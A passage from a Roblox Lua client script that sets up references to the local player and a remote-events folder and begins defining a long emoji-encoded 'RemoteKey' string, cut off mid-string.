local Player = game.Players.LocalPlayer
local ReplicatedStorage = game.ReplicatedStorage
local REvents = ReplicatedStorage.REvents

local RemoteKey = "\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\226\156\168\240\159\152\130\240\159\146\150\240\159\142\133\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\226\156\168\240\159\152\130\240\159\146\150\240\159\142\133\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\226\156\168\240\159\152\130\240\159\146\150\240\159\142\133\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\226\156\168\240\159\152\130\240\159\146\150\240\159\142\133\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\226\156\168\240\159\152\130\240\159\146\150\240\159\142\133\240\159\145\169\226\128\141\226\156\148\240\159\144\177\226\128\141\240\159\145\147\240\159\152\137\240\159\152\137\240\159\145\169\226\128\141\240\159\154\146\240\159\152\152\240\159\145\168\226\128\141\240\159\154\128\240\159\164\162\240\159\164\148\240\159\152\134\226\156\168\